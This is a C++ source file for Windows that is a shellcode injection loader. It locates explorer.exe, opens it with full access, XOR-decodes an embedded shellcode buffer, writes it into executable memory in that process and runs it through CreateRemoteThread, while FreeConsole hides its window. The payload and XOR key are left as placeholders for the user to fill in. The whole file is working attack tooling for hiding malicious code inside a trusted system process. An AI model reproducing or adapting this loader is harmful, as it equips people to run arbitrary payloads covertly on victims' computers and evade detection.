#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

unsigned char shellcode[1] = {
	0x00 //Your shellcode here
};



const unsigned char xorKey = 0x3C; //Your XOR key here

void XorEncryptDecrypt(unsigned char* data, size_t dataLen, unsigned char key) {
	for (size_t i = 0; i < dataLen; ++i) {
		data[i] ^= key;
	}
}

DWORD GetProcessIdByName(const wchar_t* processName) {
	DWORD processId = 0;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	if (Process32First(hSnapshot, &pe32)) {
		do {
			if (_wcsicmp(pe32.szExeFile, processName) == 0) {
				processId = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return processId;
}

int main() {
	FreeConsole();
	try {
		const wchar_t* processName = L"explorer.exe";
		DWORD processId = GetProcessIdByName(processName);

		if (processId == 0) {

			return 1;
		}

		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
		if (hProcess == NULL) {

			return 1;
		}


		XorEncryptDecrypt(shellcode, sizeof(shellcode), xorKey);

		LPVOID pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (pShellcode == NULL) {
			CloseHandle(hProcess);

			return 1;
		}

		if (!WriteProcessMemory(hProcess, pShellcode, shellcode, sizeof(shellcode), NULL)) {
			VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
			CloseHandle(hProcess);

			return 1;
		}

		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);
		if (hThread == NULL) {
			VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
			CloseHandle(hProcess);

			return 1;
		}

		Sleep(5000);
		CloseHandle(hThread);
		VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
		CloseHandle(hProcess);

		return 0;
	}
	catch (const std::exception& e) {

		return 1;
	}
}
